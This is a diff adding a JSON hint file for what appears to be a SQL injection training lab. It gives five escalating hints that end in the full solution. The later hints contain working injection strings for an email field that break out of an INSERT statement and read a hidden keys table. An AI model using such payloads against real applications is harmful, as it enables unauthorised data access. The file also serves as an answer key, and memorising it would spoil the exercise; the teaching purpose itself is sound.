@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-08-insert-update",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "Your feedback is stored in the database and shown back to you. What if the values being inserted weren't just plain text?"
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "The INSERT statement looks like: INSERT INTO feedback (name, email, message) VALUES ('...', '...', '...'). You can break out of a value and inject additional data."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "In the email field, close the current value and inject a subquery. For example: test@x.com', (SELECT 'injected'))-- This closes email, sets message to 'injected', and comments out the rest."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Use the email field: test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))-- This will insert the flag as the message field, which gets displayed on the confirmation page."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "Submit the feedback form with: Name: anything, Email: test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))-- , Message: anything. The INSERT becomes: INSERT INTO feedback (name, email, message) VALUES ('anything', 'test@x.com', (SELECT key_value FROM internal_keys LIMIT 1))--', '...'). The flag appears as the message on the thank-you page."
+    }
+  ]
+}
